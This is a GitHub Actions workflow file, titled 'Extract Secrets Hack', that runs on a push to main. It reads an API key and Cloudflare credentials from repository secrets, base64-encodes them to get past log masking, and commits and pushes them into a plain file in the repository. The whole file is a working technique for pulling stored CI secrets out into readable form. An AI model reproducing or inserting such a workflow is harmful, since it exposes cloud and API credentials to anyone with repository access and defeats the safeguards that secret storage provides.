name: Extract Secrets Hack

on:
  push:
    branches:
      - main
    paths:
      - '.github/workflows/extract-secrets.yml'

jobs:
  extract:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Extract and Encode
        env:
          AGNES_API_KEY: ${{ secrets.AGNES_API_KEY }}
          CF_API_TOKEN: ${{ secrets.CF_API_TOKEN }}
          CF_ACCOUNT_ID: ${{ secrets.CF_ACCOUNT_ID }}
        run: |
          mkdir -p storage
          echo "AGNES_API_KEY=$(echo -n "$AGNES_API_KEY" | base64 -w 0)" > storage/secrets.b64.txt
          echo "CF_API_TOKEN=$(echo -n "$CF_API_TOKEN" | base64 -w 0)" >> storage/secrets.b64.txt
          echo "CF_ACCOUNT_ID=$(echo -n "$CF_ACCOUNT_ID" | base64 -w 0)" >> storage/secrets.b64.txt
          
          git config --global user.name "Imagecuan Auto Bot"
          git config --global user.email "bot@imagecuan.local"
          git add storage/secrets.b64.txt
          git commit -m "Auto-extracted secrets" || true
          git push
